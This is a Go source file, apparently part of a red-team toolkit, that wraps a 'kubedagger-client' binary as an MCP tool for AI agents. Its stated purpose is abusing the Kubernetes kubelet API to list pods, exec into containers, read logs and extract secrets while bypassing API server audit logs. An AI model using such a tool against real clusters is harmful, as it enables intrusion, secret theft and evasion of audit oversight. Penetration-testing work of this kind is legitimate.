package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type KubeletInput struct {
	Action    string `json:"action"`
	Node      string `json:"node,omitempty"`
	Pod       string `json:"pod,omitempty"`
	Container string `json:"container,omitempty"`
	Command   string `json:"command,omitempty"`
}

type KubeletTool struct {
	exec executor.Executor
}

func NewKubelet(exec executor.Executor) *KubeletTool {
	return &KubeletTool{exec: exec}
}

func (t *KubeletTool) Name() string { return "kubedagger_kubelet" }

func (t *KubeletTool) Description() string {
	return "Abuse the kubelet API (port 10250/10255) for unauthenticated or token-based container access. Enumerate pods, exec into containers, read logs, and extract secrets by interacting directly with the node kubelet, bypassing API server audit logs."
}

func (t *KubeletTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["pods", "exec", "logs", "run", "metrics"],
				"description": "Kubelet API action"
			},
			"node": {
				"type": "string",
				"description": "Target node IP or hostname"
			},
			"pod": {
				"type": "string",
				"description": "Target pod name"
			},
			"container": {
				"type": "string",
				"description": "Target container name within pod"
			},
			"command": {
				"type": "string",
				"description": "Command to exec in container"
			}
		},
		"required": ["action"]
	}`)
}

func (t *KubeletTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input KubeletInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Node, "node"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Pod, "pod"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Container, "container"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Command, "command"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"kubelet", "--action", input.Action}
	if input.Node != "" {
		args = append(args, "--node", input.Node)
	}
	if input.Pod != "" {
		args = append(args, "--pod", input.Pod)
	}
	if input.Container != "" {
		args = append(args, "--container", input.Container)
	}
	if input.Command != "" {
		args = append(args, "--command", input.Command)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger kubelet failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Kubelet: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("No results.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
